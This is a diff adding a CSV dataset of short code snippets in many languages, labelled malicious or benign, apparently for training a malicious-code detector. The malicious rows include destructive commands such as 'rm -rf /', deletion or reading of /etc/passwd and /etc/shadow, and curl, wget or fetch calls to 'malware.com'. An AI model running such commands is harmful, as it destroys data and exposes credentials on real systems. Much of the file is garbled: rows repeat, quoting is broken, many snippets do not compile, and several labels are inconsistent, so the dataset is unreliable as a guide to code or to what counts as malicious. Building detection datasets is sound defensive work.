@@ -1,0 +1,210 @@
+Language,CodeSnippet,Label
+Python,import os; os.system('rm -rf /'),1
+Python,"def add(a, b): return a + b",0
+Python,import requests; requests.get('http://1.com'),1
+Python,for i in range(10): print(i),0
+Python,"eval('__import__(\os\"").system(\""ls\"")')""",1
+Python,"def multiply(a, b): return a * b",0
+Python,"import subprocess; subprocess.call(['rm', '-rf', '/'])",1
+Python,"def greet(name): return f'Hello, {name}'",0
+Python,import shutil; shutil.rmtree('/'),1
+Python,"list = [1, 2, 3]; print(list)",0
+Go,package main; import 'os'; func main() { os.RemoveAll('/') },1
+Go,"package main; import 'fmt'; func main() { fmt.Println('Hello, World!') }",0
+Go,package main; import 'net/http'; func main() { http.Get('http://1.com') },1
+Go,package main; import 'math'; func main() { math.Sqrt(16) },0
+Go,"package main; import 'os/exec'; func main() { exec.Command('rm', '-rf', '/').Run() }",1
+Go,package main; import 'time'; func main() { time.Sleep(1 * time.Second) },0
+Go,package main; import 'io/ioutil'; func main() { ioutil.ReadFile('/etc/passwd') },1
+Go,package main; import 'strings'; func main() { strings.ToUpper('hello') },0
+C,#include <stdlib.h>; int main() { system('rm -rf /'); return 0; },1
+C,"#include <stdio.h>; int main() { printf('Hello, World!'); return 0; }",0
+C,"#include <stdio.h>; int main() { FILE *f = fopen('/etc/passwd', 'r'); fclose(f); return 0; }",1
+C,#include <math.h>; int main() { double x = sqrt(16); return 0; },0
+C,"#include <string.h>; int main() { char str[20]; strcpy(str, 'Hello'); return 0; }",0
+C,#include <stdlib.h>; int main() { system('curl http://1.com'); return 0; },1
+C++,#include <cstdlib>; int main() { system('rm -rf /'); return 0; },1
+C++,"#include <iostream>; int main() { std::cout << 'Hello, World!'; return 0; }",0
+C++,#include <fstream>; int main() { std::ifstream file('/etc/passwd'); return 0; },1
+C++,#include <cmath>; int main() { double x = sqrt(16); return 0; },0
+C++,#include <string>; int main() { std::string str = 'Hello'; return 0; },0
+Java,import java.io.*; public class Main { public static void main(String[] args) { new File('/').delete(); }},1
+Java,"public class Main { public static void main(String[] args) { System.out.println('Hello, World!'); }}",0
+Java,import java.net.*; public class Main { public static void main(String[] args) throws Exception { new URL('http://1.com').openConnection(); }},1
+Java,public class Main { public static void main(String[] args) { int x = 10 + 5; }},0
+Rust,use std::process::Command; fn main() { Command::new('rm').arg('-rf').arg('/').output().unwrap(); },1
+Rust,"fn main() { println!(\Hello World!\""); }""",0
+Rust,"use std::fs::File; fn main() { let _file = File::open(\/etc/passwd\"").unwrap(); }""",1
+Rust,"fn add(a: i32, b: i32) -> i32 { a + b }",0
+Rust,use std::thread::sleep; fn main() { sleep(std::time::Duration::from_secs(1)); },0
+Python,"import socket; s = socket.socket(); s.connect(('1.com', 80))",1
+Python,"def subtract(a, b): return a - b",0
+Python,"open('/etc/shadow', 'r')",1
+Python,print([x for x in range(5)]),0
+Go,os.RemoveAll('/tmp'),1
+Go,fmt.Println('Goodbye!'),0
+C,system('curl http://malware.com'),1
+C,"printf('%d', 42)",0
+C++,std::remove('/tmp/file.txt'),1
+C++,"std::vector<int> v = {1,2,3}; v.push_back(4);",0
+Java,new FileInputStream('/etc/shadow'),1
+Java,int sum = a + b;,0
+Rust,std::fs::remove_dir_all('/'),1
+Rust,"let vec = vec![1,2,3]; vec.push(4);",0
+Python,"os.rename('/tmp/file.txt', '/tmp/newfile.txt')",0
+Go,http.Get('http://example.com'),0
+C++,std::ofstream outFile('/tmp/output.txt');,0
+JavaScript ,fetch('http://malware.com'),1
+Python,import os; os.remove('/etc/passwd'),1
+Python,"def divide(a, b): return a / b",0
+Python,"import shutil; shutil.copyfile('source.txt', 'dest.txt')",0
+Python,os.system('wget http://1.com'),1
+Python,"with open('file.txt', 'w') as f: f.write('Hello')",0
+Python,"import subprocess; subprocess.run(['curl', 'http://1.com'])",1
+Python,def square(x): return x ** 2,0
+Python,"exec('print(\Hello\"")')""",0
+Python,"os.symlink('/etc/passwd', '/tmp/passwd_link')",1
+Python,print('This is a test.'),0
+Go,package main; import 'os'; func main() { os.Remove('/etc/passwd') },1
+Go,package main; import 'fmt'; func main() { fmt.Println('Goodbye!') },0
+Go,"package main; import 'os/exec'; func main() { exec.Command('curl', 'http://1.com').Run() }",1
+Go,package main; import 'time'; func main() { time.Now() },0
+Go,"package main; import 'io/ioutil'; func main() { ioutil.WriteFile('/tmp/file.txt', []byte{'H','e','l','l','o'}, 0644) }",0
+Go,package main; import 'net/http'; func main() { http.Get('http://malware.com') },1
+C,#include <stdlib.h>; int main() { system('curl http://malware.com'); return 0; },1
+C,#include <stdio.h>; int main() { printf('Goodbye!'); return 0; },0
+C,#include <unistd.h>; int main() { unlink('/tmp/file.txt'); return 0; },1
+C,"#include <string.h>; int main() { char str[20]; strcpy(str, 'Test'); return 0; }",0
+C++,#include <iostream>; int main() { std::remove('/etc/passwd'); return 0; },1
+C++,"#include <vector>; int main() { std::vector<int> v = {1,2,3}; v.push_back(4); return 0; }",0
+C++,#include <fstream>; int main() { std::ofstream outFile('/tmp/output.txt'); outFile << 'Hello'; outFile.close(); return 0; },0
+C++,#include <cstdlib>; int main() { system('wget http://malware.com'); return 0; },1
+Java,import java.io.*; public class Main { public static void main(String[] args) { File file = new File('/etc/passwd'); file.delete(); }},1
+Java,public class Main { public static void main(String[] args) { System.out.println('Goodbye!'); }},0
+Java,import java.net.*; public class Main { public static void main(String[] args) throws Exception { new URL('http://malware.com').openConnection(); }},1
+Java,public class Main { public static void main(String[] args) { int sum = 5 + 10; }},0
+Rust,"use std::fs::remove_file; fn main() { remove_file(\/etc/passwd\"").unwrap(); }""",1
+Rust,"fn add(a: i32, b: i32) -> i32 { a + b }",0
+Rust,"use std::fs::File; fn main() { let _file = File::create(\/tmp/file.txt\"").unwrap(); }""",0
+Rust,"use std::process::Command; fn main() { Command::new(\wget\"").arg(\""http://malware.com\"").output().unwrap(); }""",1
+JavaScript,fetch('http://malware.com').then(response => response.text()).then(data => console.log(data));,1
+JavaScript,console.log('Hello World!');,0
+JavaScript,eval('console.log(1 + 1)');,0
+JavaScript,document.location.href = 'http://malware.com';,1
+Ruby,File.delete('/etc/passwd') if File.exist?('/etc/passwd'),1
+Ruby,puts 'Hello World',0
+Ruby,system('curl http://malware.com'),1
+Ruby,"def add(a, b); a + b; end;",0
+Swift,"let fileManager = FileManager.default; try? fileManager.removeItem(atPath: \/etc/passwd\"")""",1
+Swift,"print(\Hello World!\"")""",0
+PHP,unlink('/etc/passwd'),1
+PHP,echo 'Hello World!';,0
+Kotlin,"File(\/etc/passwd\"").delete()""",1
+Kotlin,"println(\Hello World!\"")""",0
+Perl,unlink('/etc/passwd') if -e '/etc/passwd',1
+Perl,print 'Hello World!',0
+Dart,import 'dart:io'; void main() => File('/etc/passwd').deleteSync();,1
+Dart,void main() => print('Hello World!');,0
+Haskell,"import System.Directory (removeFile); main = removeFile \/etc/passwd\""""",1
+Haskell,"main = putStrLn \Hello World!\""""",0
+Scala,"import java.nio.file.Files; Files.deleteIfExists(Paths.get(\/etc/passwd\""))""",1
+Scala,"println(\Hello World!\"")""",0
+Objective-C,"@\""NSFileManager *fileManager = [NSFileManager defaultManager]; [fileManager removeItemAtPath:@\""/etc/passwd\"" error:nil];\""",1
+Objective-C,"@\""NSLog(@\""Hello World!\"");\""",0
+Python,import os; os.remove('/etc/passwd'),1
+Python,"def divide(a, b): return a / b",0
+Python,"import shutil; shutil.copyfile('source.txt', 'dest.txt')",0
+Python,os.system('wget http://1.com'),1
+Python,"with open('file.txt', 'w') as f: f.write('Hello')",0
+Python,"import subprocess; subprocess.run(['curl', 'http://1.com'])",1
+Python,def square(x): return x ** 2,0
+Python,"exec('print(\Hello\"")')""",0
+Python,"os.symlink('/etc/passwd', '/tmp/passwd_link')",1
+Python,print('This is a test.'),0
+Python,def secret_function(): pass; if 'backdoor_access' in locals() and backdoor_access: secret_function(),1
+Python,def normal_function(): return 'Normal'; normal_function(),0
+Python,"eval('__import__(\os\"").system(\""ls\"")')""",1
+Python,print([x for x in range(10)]),0
+Go,package main; import 'os'; func main() { os.Remove('/etc/passwd') },1
+Go,package main; import 'fmt'; func main() { fmt.Println('Goodbye!') },0
+Go,"package main; import 'os/exec'; func main() { exec.Command('curl', 'http://1.com').Run() }",1
+Go,package main; import 'time'; func main() { time.Now() },0
+Go,"package main; import 'io/ioutil'; func main() { ioutil.WriteFile('/tmp/file.txt', []byte{'H','e','l','l','o'}, 0644) }",0
+Go,package main; import 'net/http'; func main() { http.Get('http://malware.com') },1
+C,#include <stdlib.h>; int main() { system('curl http://malware.com'); return 0; },1
+C,#include <stdio.h>; int main() { printf('Goodbye!'); return 0; },0
+C,#include <unistd.h>; int main() { unlink('/tmp/file.txt'); return 0; },1
+C,"#include <string.h>; int main() { char str[20]; strcpy(str, 'Test'); return 0; }",0
+C++,#include <iostream>; int main() { std::remove('/etc/passwd'); return 0; },1
+C++,"#include <vector>; int main() { std::vector<int> v = {1,2,3}; v.push_back(4); return 0; }",0
+C++,#include <fstream>; int main() { std::ofstream outFile('/tmp/output.txt'); outFile << 'Hello'; outFile.close(); return 0; },0
+C++,#include <cstdlib>; int main() { system('wget http://malware.com'); return 0; },1
+Java,import java.io.*; public class Main { public static void main(String[] args) { File file = new File('/etc/passwd'); file.delete(); }},1
+Java,public class Main { public static void main(String[] args) { System.out.println('Goodbye!'); }},0
+Java,import java.net.*; public class Main { public static void main(String[] args) throws Exception { new URL('http://malware.com').openConnection(); }},1
+Java,public class Main { public static void main(String[] args) { int sum = 5 + 10; }},0
+Rust,"use std::fs::remove_file; fn main() { remove_file(\/etc/passwd\"").unwrap(); }""",1
+Rust,"fn add(a: i32, b: i32) -> i32 { a + b }",0
+Rust,"use std::fs::File; fn main() { let _file = File::create(\/tmp/file.txt\"").unwrap(); }""",0
+Rust,"use std::process::Command; fn main() { Command::new(\wget\"").arg(\""http://malware.com\"").output().unwrap(); }""",1
+JavaScript,fetch('http://malware.com').then(response => response.text()).then(data => console.log(data));,1
+JavaScript,console.log('Hello World!');,0
+JavaScript,eval('console.log(1 + 1)');,0
+JavaScript,document.location.href = 'http://malware.com';,1
+Ruby,File.delete('/etc/passwd') if File.exist?('/etc/passwd'),1
+Ruby,puts 'Hello World',0
+Ruby,system('curl http://malware.com'),1
+Ruby,"def add(a, b); a + b; end;",0
+Swift,"let fileManager = FileManager.default; try? fileManager.removeItem(atPath: \/etc/passwd\"")""",1
+Swift,"print(\Hello World!\"")""",0
+PHP,unlink('/etc/passwd'),1
+PHP,echo 'Hello World!';,0
+Kotlin,"File(\/etc/passwd\"").delete()""",1
+Kotlin,"println(\Hello World!\"")""",0
+Perl,unlink('/etc/passwd') if -e '/etc/passwd',1
+Perl,print 'Hello World',0
+Dart,import 'dart:io'; void main() => File('/etc/passwd').deleteSync();,1
+Dart,void main() => print('Hello World!');,0
+Haskell,"import System.Directory (removeFile); main = removeFile \/etc/passwd\""""",1
+Haskell,"main = putStrLn \Hello World!\""""",0
+Scala,"import java.nio.file.Files; Files.deleteIfExists(Paths.get(\/etc/passwd\""))""",1
+Scala,"println(\Hello World!\"")""",0
+Objective-C,"@\""NSFileManager *fileManager = [NSFileManager defaultManager]; [fileManager removeItemAtPath:@\""/etc/passwd\"" error:nil];\""",1
+Objective-C,"@\""NSLog(@\""Hello World!\"");\""",0
+Python,"def read_file(): with open('sensitive_data.txt', 'r') as file: data = file.read()",1
+Python,for i in range(5): print(i),0
+Python,import base64; encoded = base64.b64encode(b'secret data') # Encode sensitive data.,1
+Python,def is_even(num): return num % 2 == 0;,0
+Go ,"package main; import \os\""; func main(){ os.RemoveAll(\""/tmp\"")}""",1
+Go ,"package main; import \fmt\""; func main(){ fmt.Println(\""This is safe.\"")}""",0
+Go ,"package main; import \net/http\""; func 1Request(){ http.Get(\""http://malware.com\"")}""",1
+Go ,"package main ; import \math\"" ; func square(x float64) float64{ return math.Pow(x, 2)} """,0
+C ,"#include <stdlib.h>; int main(){ system(\rm -rf /tmp\""); return 0;} """,1
+C ,"#include <stdio.h>; int main(){ printf(\This is safe.\""); return 0;} """,0
+C ,#include <string.h>; int main(){ char buffer[256]; gets(buffer); } ,1
+C ,#include <math.h>; int factorial(int n){ if(n==0) return 1; else return n*factorial(n-1);},0
+C++ ,"#include <iostream>; void 1Function(){ system(\curl http://malware.com\"");} """,1
+C++ ,"#include <vector>; void safeFunction(){ std::vector<int> v{1,2,3};}",0
+Java ,"public class Main{ public static void 1Method(){ Runtime.getRuntime().exec(\curl http://malware.com\"");} } """,1
+Java ,"public class Main{ public static void safeMethod(){ System.out.println(\This is safe.\"");} } """,0
+Rust ,"fn 1_code(){ std::process::Command::new(\rm\"").arg(\""-rf\"").arg(\""/\"").output().unwrap();} """,1
+Rust ,"fn safe_code(){ println!(\This is safe.\"");} """,0
+JavaScript ,let userInput = prompt('Enter your input:'); eval(userInput); ,1
+JavaScript ,console.log('Safe operation.'); ,0
+Ruby ,system('rm -rf /tmp/') ,1
+Ruby ,puts 'This is safe.' ,0
+Swift ,"let _ = try? FileManager.default.removeItem(atPath: \/tmp/file.txt\"") """,1
+Swift ,"print(\This is a safe operation.\"") """,0
+PHP ,exec('rm -rf /tmp/') ,1
+PHP ,echo 'Safe PHP operation.';,0
+Kotlin ,"val process = Runtime.getRuntime().exec(rm -rf /tmp/"") """,1
+Kotlin ,"println(Safe Kotlin operation."") """,0
+Perl ,"system(rm -rf /tmp/"") """,1
+Perl ,"print Safe Perl operation."";""",0
+Dart ,"void printMessage(){ print(Safe Dart operation."");} """,0
+Haskell ,"main = do{ removeFile /tmp/file.txt"";}"" ",1
+Haskell ,"main = putStrLn Safe Haskell operation."";""",0
+Scala ,"Files.deleteIfExists(Paths.get(/tmp/file.txt""))"" ",1
+Scala ,"println(Safe Scala operation."")"" ",0
+Objective-C ,"@""NSFileManager *fileManager = [NSFileManager defaultManager]; [fileManager removeItemAtPath:@""/tmp/file.txt"" error:nil];"" ",1
+Objective-C ,"@""NSLog(@""Safe Objective-C operation."");"" ",0
